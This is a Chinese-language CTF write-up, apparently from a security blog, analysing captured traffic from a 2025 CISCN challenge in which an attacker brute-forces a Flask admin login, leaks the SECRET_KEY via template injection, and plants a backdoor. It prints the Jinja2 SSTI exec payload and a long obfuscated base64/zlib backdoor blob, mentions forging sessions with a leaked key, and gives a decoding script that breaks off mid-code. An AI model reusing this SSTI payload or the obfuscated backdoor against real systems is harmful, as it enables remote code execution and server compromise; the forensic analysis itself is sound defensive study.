---
title: 2025CISCN流量分析全复盘与技法总结
url: https://mp.weixin.qq.com/s/hBavBxBqjRwiDhnfkzvOFg
source: Doonsec's feed
date: 2026-01-09
fetch_date: 2026-01-10T03:22:13.843918
---

# 2025CISCN流量分析全复盘与技法总结

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldx0cjLr3xNVgAL3rTvJk8wcrd600iaksI6w0ia2dCEbicicwIXXslY6gCDBibicTgZ2x82ibontFVNaKco7g/0?wx_fmt=jpeg)

# 2025CISCN流量分析全复盘与技法总结

原创

秋名山上的小柠

蚁景网络安全

![]()

在小说阅读器中沉浸阅读

##### 0.前言

一直以来都想写个流量分析的做题总结，总结一些思路和方法，但找不到好的例题，刚好国赛这道流量分析就挺适合的

题目内容

```
近期发现公司网络出口出现了异常的通信，现需要通过分析出口流量包，对失陷服务器进行定位。现在需要你从网络攻击数据包中找出漏洞攻击的会话，分析会话编写exp或数据包重放，查找服务器上安装的后门木马，然后分析木马外联地址和通信密钥以及木马启动项位置。
```

##### 1.SnakeBackdoor-1

```
攻击者爆破成功的后台密码是什么？，结果提交形式：flag{xxxxxxxxx}
```

直接筛选出http流量

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldx0cjLr3xNVgAL3rTvJk8wcuibvLjbjgWznaWgTp3477ibwttHs38Mh5Wl6zk2gpV63LdiapcBLIRlVA/640?wx_fmt=png&from=appmsg "null")

并找到最后一个login，右键追踪一下，就看到后台密码了

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldx0cjLr3xNVgAL3rTvJk8wcahHLurPYcVcsMTEGaAw00ay8IZOLYBFo02vcNWNZpJxFZo3kVmN3Mg/640?wx_fmt=png&from=appmsg "null")

flag{zxcvbnm123}

##### 2.SnakeBackdoor-2

```
攻击者通过漏洞利用获取Flask应用的 `SECRET_KEY` 是什么，结果提交形式：flag{xxxxxxxxxx}
```

模糊查询，直接找到这个关键字“SECRET\_KEY"

```
http contains "SECRET_KEY"
```

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldx0cjLr3xNVgAL3rTvJk8wcHSaMX2yuhyzicFNyRbNWlFA6cumibzMicAZWuahuo4ZNRQj4pLaM5KvTw/640?wx_fmt=png&from=appmsg "null")

右键进行一个追踪，并查询关键字SECRET\_KEY

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldx0cjLr3xNVgAL3rTvJk8wcya2BXrc64DTibzNdHuIDWQ2bURAsG9szDgxSKuyvMDia9SBuPicEFKqKg/640?wx_fmt=png&from=appmsg "null")

这段流量是 **Flask 框架应用配置对象** 的完整序列化输出，攻击者通过 **SSTI（服务端模板注入）** 漏洞成功读取了内存中的敏感变量

* • **内容**：'SECRET\_KEY': 'c6242af0-6891-4510-8432-e1cdf051f160'
* • **安全意义**：这是 Flask 应用最核心的安全凭证
* • **一般用来**：Session  签名，也就是Flask 默认将 Session 存储在客户端 Cookie 中，并使用此 Key 进行 HMAC  签名，一旦泄露，攻击者可以使用工具，比如说 flask-unsign伪造任意用户的 Session，例如将 user\_id 改为 1 或  admin，从而实现**越权登录**，甚至在某些配置下导致 **RCE**

所以对应的flag{c6242af0-6891-4510-8432-e1cdf051f160}

##### 3.SnakeBackdoor-3

```
攻击者植入的木马使用了加密算法来隐藏通讯内容。请分析注入Payload，给出该加密算法使用的密钥字符串(Key) ，结果提交形式：flag{xxxxxxxx}
```

继续往后翻，会发现1789流有异常

![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldx0cjLr3xNVgAL3rTvJk8wcKckp0cD4PJRTibZcy1yibCbQWtteTO3GeElCd1fsfLiaK1Dp9aymuXLSA/640?wx_fmt=png&from=appmsg "null")

> 为什么说这段流量是可疑的？

* • 首先，内容以 {{ ... }} 包裹，正常的“预览预览”功能应该只处理纯文本或简单的 HTML，而这里提交的是 Jinja2 模板执行代码
* • 其次，它有危险函数的调用，载荷中出现了 `url_for.__globals__['__builtins__']['exec']`

+ • **globals**，我们都知道它是试图访问 Python 的全局命名空间
+ • exec，这又是 Python 最危险的函数，能将字符串当作代码执行，基本上**任何在流量中看到的 exec 基本上都是 RCE 的标志**

* • 接着，它里面还嵌套了 base64.b64decode、zlib.decompress 以及 [::-1]等一大堆乱七八糟的东西，正常的业务请求绝不会将代码进行压缩、反转再发送
* • 最后，一个简单的“Hello World”预览请求通常只有几十个字节，但这个请求的 Content-Length 达到了 **4602** 字节，说明其中隐藏了复杂的逻辑脚本

判断好之后，我们就要分析这段内容是什么了

首先是SSTI 注入层，使用 {{`url_for.__globals__['__builtins__']['exec']`(代码, 上下文)}}，这是利用了 Flask 的模板注入漏洞来调用 Python 的内置 exec 函数

其次，Base64 编码层（外壳）exec(base64.b64decode('XyA9IGxh...'))这段 **Base64 解码**后是
`_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1])); exec((_)(b'=c4CU3xP...'))`
这定义了一个解密函数 \_：**反转字符串 -> Base64 解码 -> Zlib 解压**

```
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(b'=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'))
```

接着，反转 + Zlib 压缩层
攻击者将真正的恶意代码，也就是上述那段以 =c4CU3xP 开头的巨大字符串，进行了 Zlib 压缩，并做了**字符反转**，最后再 Base64 编码

最后注意 Payload 末尾：{'request':..., 'app':get\_flashed\_messages.**globals**['current\_app']}，攻击者将 Flask 的 app 对象传入了执行环境。这意味着恶意代码可以直接读取 app.config

所以exp.py

```
import base64
import zlib
import re
from typing importTuple, Optional

classPayloadDecoder:
    def__init__(self, max_layers: int = 200):
        self.max_layers = max_layers
        self.pattern = r"exec\(\(_\)\(b'([^']+)'\)\)"

    def_reverse_bytes(self, data: bytes) -> bytes:
        return data[::-1]

    def_base64_decode(self, data: bytes) -> bytes:
        return base64.b64decode(data)

    def_zlib_decompress(self, data: bytes) -> bytes:
        return zlib.decompress(data)

    def_extract_nested_payload(self, text: str) -> Optional[str]:
        match = re.search(self.pattern, text)
        returnmatch.group(1) ifmatchelseNone

    defdecode_blob(self, encoded: bytes) -> bytes:
        reversed_data = self._reverse_bytes(encoded)
        decoded = self._base64_decode(reversed_data)
        decompressed = self._zlib_decompress(decoded)
        return decompressed

    defprocess_payload(self, payload: bytes) -> Tuple[int, bytes]:
        current = self.decode_blob(payload)
        layer_count = 1

        while layer_count < self.max_layers:
            try:
                text_content = current.decode('utf-8')
            except UnicodeDecodeError:
                text_content = current.decode('utf-8', errors='replace')

            extracted = self._extract_nested_payload(text_content)

            if extracted isNone:
                break

            current = self.decode_blob(extracted.encode())
            layer_count += 1

        return layer_c...